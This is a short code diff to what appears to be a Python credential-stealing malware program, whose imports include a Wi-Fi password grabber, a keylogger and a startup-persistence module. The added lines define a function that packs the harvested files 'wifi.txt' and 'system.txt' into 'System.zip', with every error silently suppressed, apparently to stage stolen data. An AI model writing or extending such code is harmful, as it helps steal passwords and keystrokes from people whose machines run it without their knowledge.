@@ -4,6 +4,7 @@ from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
 from tkinter import messagebox
+import zipfile
 
 
 try:
@@ -46,6 +47,18 @@ if Startup == "True":
     except Exception as e:
         pass
 
+def zip(name, files):
+    try:
+        with zipfile.ZipFile(name, "w") as zip:
+            for file in files:
+                try:
+                    zip.write(file)
+                except:
+                    pass
+    except:
+        pass
+    
+zip("System.zip", ["wifi.txt", "system.txt"])
 
 if keylogger == "True":
     try:
